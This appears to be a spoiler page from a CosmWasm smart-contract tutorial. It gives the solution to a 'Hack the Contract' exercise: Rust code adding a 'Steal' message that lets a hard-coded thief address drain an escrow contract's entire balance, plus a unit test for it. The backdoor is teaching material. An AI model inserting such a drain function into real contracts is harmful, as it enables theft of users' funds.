---
sidebar_position: 3
---

# Hints

:::danger **SPOILER ALERT**

This section contains solutions to the questions presented in the [Hack the Contract](./hack-contract.md) section.
:::

## ExecuteMsg {#executemsg}

```rust
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum ExecuteMsg {
  Approve {
    // release some coins - if quantity is None, release all coins in balance
    quantity: Option<Vec<Coin>>,
  },
  Refund {},
  Steal {
    destination: String,
  },
}
```

## Adding Handler {#adding-handler}

Add a global constant:

```rust
// this will be the bech32-encoded address in final code
// we cannot use Addr in const as that is heap allocated... use `Addr::from() later
const THIEF: &str = "changeme";
```

Update the `match` statement in `execute`:

```rust
match msg {
  ExecuteMsg::Approve { quantity } => execute_approve(deps, env, info, quantity),
  ExecuteMsg::Refund {} => execute_refund(deps, env, info),
  ExecuteMsg::Steal { destination } => execute_steal(deps, env, info, destination),
}
```

Implement `execute_steal`:

```rust
fn execute_steal(
  deps: DepsMut,
  env: Env,
  info: MessageInfo,
  destination: String,
) -> Result<Response, ContractError> {
  if info.sender != deps.api.addr_validate(THIEF)? {
    return Err(ContractError::Unauthorized {});
  }
  let destination = deps.api.addr_validate(destination.as_str())?;
  let contract_address = env.contract.address;
  let amount = deps.querier.query_all_balances(&contract_address)?;
  Ok(send_tokens(destination, amount, "approve"))
}
```

## Test Steal {#test-steal}

```rust
#[test]
fn handle_steal() {
  let mut deps = mock_dependencies();

  // initialize the store
  let init_amount = coins(1000, "earth");
  let msg = init_msg_expire_by_height(Some(Expiration::AtHeight(1000)));
  let mut env = mock_env();
  env.block.height = 876;
  let info = mock_info("creator", &init_amount);
  let contract_addr = env.clone().contract.address;
  let init_res = instantiate(deps.as_mut(), env, info, msg).unwrap();
  assert_eq!(0, init_res.messages.len());

  // balance changed in init
  deps.querier.update_balance(&contract_addr, init_amount);

  // not just "anybody" can steal the funds
  let msg = ExecuteMsg::Steal {
    destination: "anybody".into(),
  };
  let mut env = mock_env();
  env.block.height = 900;

  let info = mock_info("anybody", &[]);
  let execute_res = execute(deps.as_mut(), env, info, msg.clone());
  match execute_res.unwrap_err() {
    ContractError::Unauthorized {} => {}
    e => panic!("unexpected error: {:?}", e),
  }

  // only the thief can steal the funds
  let msg = ExecuteMsg::Steal {
    destination: "changeme".to_string(),
  };
  let mut env = mock_env();
  env.block.height = 900;

  let info = mock_info("changeme", &[]);
  let execute_res = execute(deps.as_mut(), env, info, msg.clone()).unwrap();
  assert_eq!(1, execute_res.messages.len());
  let msg = execute_res.messages.get(0).expect("no message");
  assert_eq!(
    msg.msg,
    CosmosMsg::Bank(BankMsg::Send {
      to_address: "changeme".into(),
      amount: coins(1000, "earth"),
    })
  );
}
```
